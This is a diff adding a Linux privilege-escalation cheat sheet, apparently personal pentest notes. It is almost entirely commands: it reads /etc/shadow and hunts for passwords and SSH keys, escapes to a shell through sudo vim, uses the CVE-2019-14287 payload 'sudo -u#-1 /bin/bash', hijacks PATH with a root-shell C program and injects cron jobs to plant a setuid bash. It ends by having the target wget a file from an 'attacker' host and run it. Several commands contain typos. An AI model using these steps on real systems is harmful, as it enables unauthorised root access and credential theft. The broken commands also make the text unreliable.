@@ -1,0 +1,197 @@
+Linux Privilege Escalation:
+
+
+ 
+1)system enumeration
+
+cmd > hostname 
+
+cmd > uname -a  ---> search for exploit after finding
+
+cmd > cat /proc/version
+ 
+cmd > cat /etc/issue
+
+cmd > lscpu
+
+cmd > ps aux  ---> for task running
+
+cmd > ps aux | grep root  -> what task running by root
+
+2) user enumeration
+
+cmd > whoami
+
+cmd > id
+
+cmd > sudo -l   --> what we can run as sudo
+
+cmd > cat /etc/passwd
+
+cmd > cat /etc/shadow
+
+cmd > cat /etc/group
+
+cmd > history
+
+3) Network Enumeration
+
+cmd > ifconfig (or) ip a 
+
+cmd > ip route
+
+cmd > arp -a (or) ip neigh
+
+cmd > netstat -ano
+
+4) Password Hunting
+
+cmd > grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
+
+cmd > locate password | more
+
+cmd > locate pass
+
+cmd > find / -name id_rsa 2> /dev/null   ---> for ssh key
+
+
+
+
+= > kernel exploit
+--------------
+
+cmd >uname -a
+
+searchsploit the result
+
+
+= > stored passwords and weak file permissions
+-------------------------------------------
+
+for pass
+---------
+cmd > history
+cmd > ls -al 
+cmd > cat .bash_history
+cmd > find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+
+
+for weak file permissions
+-------------------------
+
+cmd > ls -al /etc/passwd
+cmd > ls -al /etc/shadow
+look at permissions 
+if we have read access to shadow file we can crack password using hashcat
+
+
+for sshkeys
+------------
+cmd > find / -name authorized_keys 2 > /dev/null
+cmd > fnd / -name id_rsa 2> /dev/null
+ 
+if we find key
+copy the key to attacker machine and login with it
+cmd > cp id_rsa /Desktop/id_rsa
+cmd > chmod 600 id_rsa
+cmd> ssh -i id_rsa root@ip
+
+
+= > Sudo shell escaping
+-----------------------
+
+cmd > sudo -l    ---> which we can run as root without password
+
+after findind them go to gtfobins and search with the keys like vim, awk 
+
+cmd > sudo vim -c ':!/bin/sh'
+
+
+
+= > escalation via intended functionality
+------------------------------------------
+cmd > sudo -l utilise it and search in google to get privilege escalation
+
+===> CVE 2019-14287
+===================
+
+IF cmd > sudo -l gives op : (ALL, !root) NOPASSWD : /bin/bash
+then payload : cmd > sudo -u#-1 /bin/bash
+
+
+
+= > SUIDs
+---------
+
+cmd > ls -al
+cmd > find / -perm -u=s -type f 2>dev/null
+and go to gtfobins and search for payload
+
+
+= > ENV Variables
+------------------
+
+cmd > env
+
+cmd > find / -type f -perm -04000 -ls 2>/dev/null
+
+find any service and then strings of it and if you find any env variable then exploit
+
+cmd > Strings
+
+cmd > print $PATH   -- > to see the path variables
+
+cmd > echo 'int main() { setgit(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
+
+cmd > gcc /tmp/service.c -o /tmp/service
+cmd > export PATH=/tmp:$PATH
+
+then call for the service to execute it 
+cmd > /usr/local/bin/sud-env
+
+then we get root shell
+
+
+= > cron jobs
+-------------
+
+cmd > cat /etc/crontab
+
+look at the path and files and if files have writable permissions, write it to execute shell
+
+cmd > echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >>/usr/bin/filenamewhichhaswritepermissons
+
+now execute the shell 
+cmd > /tmp/bash  -p
+
+
+
+HOW TO TRANSFER FILES FROM ATTACKER BOX TO TARGET
+--------------------------------------------------
+
+in attacker box
+-----------------
+cmd > python -m SimpleHTTPServer 80
+
+in target after getting shell
+-----------------------------
+cmd > wget http://attackerip/file.exe
+cmd > chmod +x file.exe
+cmd > ./filename.sh
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
